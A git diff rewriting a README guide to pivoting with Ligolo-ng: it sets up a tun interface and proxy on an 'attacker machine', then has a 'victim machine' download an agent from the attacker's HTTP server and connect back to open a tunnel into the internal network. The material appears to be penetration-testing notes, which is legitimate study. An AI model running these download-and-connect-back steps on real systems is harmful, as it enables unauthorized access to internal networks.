@@ -1,66 +1,115 @@
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=30&duration=4000&pause=1&color=FFFFFF&multiline=true&width=485&height=80&lines=%E2%94%8C%E2%94%80%E2%94%80(ThisizAmen%E3%89%BFKaniber)-%5B%2F%5D;%E2%94%94%E2%94%80%23+Ligolo+Proxy+Setup)](https://git.io/typing-svg)  
-----------------------------------------------------------------------------------------------------------------------------
+[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=30&duration=4000&pause=1&color=FFFFFF&multiline=true&width=485&height=80&lines=%E2%94%8C%E2%94%80%E2%94%80(ThisizAmen%E3%89%BFKaniber)-%5B%2F%5D;%E2%94%94%E2%94%80%23+Ligolo+Proxy+Setup)](https://git.io/typing-svg)
 
-First of all we need to download 2 executables;
-1. Ligolo Agent
-2. Ligolo Proxy
+---
 
-Proxy Download
+## Overview
+
+This guide provides step-by-step instructions to set up Ligolo Proxy and Ligolo Agent for establishing a reverse proxy tunnel between an attacker machine and a victim machine. This setup allows for accessing internal network resources through the tunnel.
+
+### Prerequisites
+
+- Linux-based system
+- Root privileges (or equivalent)
+- Ligolo Proxy and Ligolo Agent executables
+
+---
+
+## 1. Download Ligolo Proxy and Agent
+
+Before setting up the tunnel, you need to download the necessary executables:
+
+- **Ligolo Proxy**: A tool for setting up the reverse proxy on the attacker machine.
+- **Ligolo Agent**: A tool that runs on the victim machine to connect back to the attacker.
+
+### Proxy Download:
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
 ```
-Agent Download
+
+### Agent Download:
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
 ```
 
-----------------------------------------------------------------------------------------------------------------------------
-
-# In our Attack Machine
-
-Change the user 'root' as your own user
+After downloading, unpack the `.tar.gz` files using:
 ```bash
-sudo ip tuntap add user root mode tun ligolo
+tar -xzvf <filename>.tar.gz
 ```
 
-Next if you use any vpn address to connect with, delete the internal ip range which you want to connect
+---
+
+## 2. Setup Ligolo Tunnel on the Attacker Machine
+
+### Change the user from 'root' to your custom user (optional but recommended for security):
+```bash
+sudo ip tuntap add user <your_username> mode tun ligolo
+```
+
+### Delete any conflicting IP routes (if you're using VPN):
 ```bash
 sudo ip route del 192.168.98.0/24 dev tun0
 ```
 
-Setup the Ligolo tunnel and add the range which you want to connect
+### Add the desired internal network range to the Ligolo tunnel:
 ```bash
 sudo ip link set ligolo up
-
 sudo ip route add 192.168.98.0/24 dev ligolo
 ```
 
-Start your Ligolo Proxy
+### Start the Ligolo Proxy:
 ```bash
 ./proxy -selfcert -laddr 0.0.0.0:443
 ```
 
-----------------------------------------------------------------------------------------------------------------------------
+---
 
-# In the Victim machine
+## 3. Setup Ligolo Agent on the Victim Machine
 
-Download the Ligolo agent to victim machine and start it (Do not forget to set up the python http.server in your attacker machine 'python3 -m http.server')
+### Download the Ligolo Agent from the Attacker Machine:
+
+Ensure you have a Python HTTP server running on the attacker machine to serve the agent:
 ```bash
-wget http://attacker_machine_ip_address:8000/agent /opt/
-
-chmod +x agent
-
-./agent -connect attacker_machine_ip_address -ignore-cert
+python3 -m http.server 8000
 ```
 
-----------------------------------------------------------------------------------------------------------------------------
+On the victim machine, download the agent:
+```bash
+wget http://<attacker_machine_ip>:8000/agent -P /opt/
+```
 
-# Again in our Attacker machine
-In the ligolo menu
+### Make the Agent executable and run it:
+```bash
+chmod +x /opt/agent
+/opt/agent -connect <attacker_machine_ip> -ignore-cert
+```
+
+---
+
+## 4. Access the Internal Network (Attacker Machine)
+
+Once the agent is running on the victim machine and connected back to the attacker, follow these steps to access the internal network:
+
+1. Open the Ligolo menu:
 ```bash
 session
+```
 
+2. Start the session:
+```bash
 start
 ```
 
-Now we can easily access to the internal network which we wanted to connect
+---
+
+## Conclusion
+
+You have now successfully set up the Ligolo Proxy and Agent, allowing access to the internal network of the victim machine. You can now interact with the internal resources securely through the established tunnel.
+
+---
+
+### Tips & Troubleshooting
+
+- If the connection is not working, ensure that both machines are on the same network or have reachable IPs.
+- Check firewall rules if any traffic is being blocked.
+- Ensure that the correct paths for executables are set in the commands.
+
